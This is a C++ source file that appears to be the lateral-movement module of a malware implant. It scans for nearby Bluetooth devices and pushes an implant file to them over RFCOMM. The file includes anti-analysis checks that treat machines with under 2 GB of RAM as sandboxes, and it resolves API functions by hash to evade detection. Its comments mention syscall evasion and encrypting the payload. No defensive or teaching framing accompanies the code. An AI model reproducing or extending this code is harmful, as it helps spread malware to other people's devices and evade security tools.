#include "BluetoothLateral.h"
#include "../fs/FileSystem.h"
#include "../utils/Shared.h"
#include <windows.h>
#include <bluetoothapis.h>
#include <ws2bth.h>
#include <bthdef.h>
#include <bthsdpdef.h>

#pragma comment(lib, "bthprops.lib")
#pragma comment(lib, "ws2_32.lib")

namespace lateral {

bool DiscoverAndShare(const std::string& implantPath) {
    // Anti-analysis: Check RAM/procs
    MEMORYSTATUSEX mem; mem.dwLength = sizeof(mem);
    GlobalMemoryStatusEx(&mem);
    if (mem.ullTotalPhys < (1ULL << 31)) return false;  // <2GB = sandbox

    // Dynamic load
    HMODULE hBt = LoadLibraryA("bthprops.lib");  // Hash "BluetoothFindFirstDevice"
    typedef HBLUETOOTH_DEVICE_FIND (WINAPI *pBluetoothFindFirstDevice)(const BLUETOOTH_DEVICE_SEARCH_PARAMS*, BLUETOOTH_DEVICE_INFO*);
    typedef BOOL (WINAPI *pBluetoothFindNextDevice)(HBLUETOOTH_DEVICE_FIND, BLUETOOTH_DEVICE_INFO*);
    typedef BOOL (WINAPI *pBluetoothFindDeviceClose)(HBLUETOOTH_DEVICE_FIND);

    pBluetoothFindFirstDevice pFindFirst = (pBluetoothFindFirstDevice)utils::getProcByHash(hBt, utils::djb2Hash("BluetoothFindFirstDevice"));
    pBluetoothFindNextDevice pFindNext = (pBluetoothFindNextDevice)utils::getProcByHash(hBt, utils::djb2Hash("BluetoothFindNextDevice"));
    pBluetoothFindDeviceClose pFindClose = (pBluetoothFindDeviceClose)utils::getProcByHash(hBt, utils::djb2Hash("BluetoothFindDeviceClose"));

    if (!pFindFirst || !pFindNext || !pFindClose) {
        FreeLibrary(hBt);
        return false;
    }

    BLUETOOTH_DEVICE_SEARCH_PARAMS searchParams = { sizeof(searchParams), 1, 0, 1, 1, 1, 15, NULL };
    BLUETOOTH_DEVICE_INFO devInfo = { sizeof(devInfo) };
    HBLUETOOTH_DEVICE_FIND hFind = pFindFirst(&searchParams, &devInfo);
    if (hFind) {
        do {
            // Pair if needed (BluetoothAuthenticateDevice - risky, user prompt)
            // evasion: Syscall for auth
            // Push file via sockets (RFCOMM)
            SOCKET sock = socket(AF_BTH, SOCK_STREAM, BTHPROTO_RFCOMM);
            SOCKADDR_BTH addr = { 0 };
            addr.addressFamily = AF_BTH;
            addr.btAddr = devInfo.Address.ullLong;
            addr.serviceClassId = OBEXFileTransferServiceClass_UUID;
            addr.port = 0;

            if (connect(sock, (SOCKADDR*)&addr, sizeof(addr)) == 0) {
                auto data = fs::ReadFileBinary(implantPath);
                send(sock, (char*)data.data(), data.size(), 0);  // Obfuscate with encryption
                closesocket(sock);
                pFindClose(hFind);
                FreeLibrary(hBt);
                return true;
            }
            closesocket(sock);
        } while (pFindNext(hFind, &devInfo));
        pFindClose(hFind);
    }
    FreeLibrary(hBt);
    return false;
}

} // namespace lateral
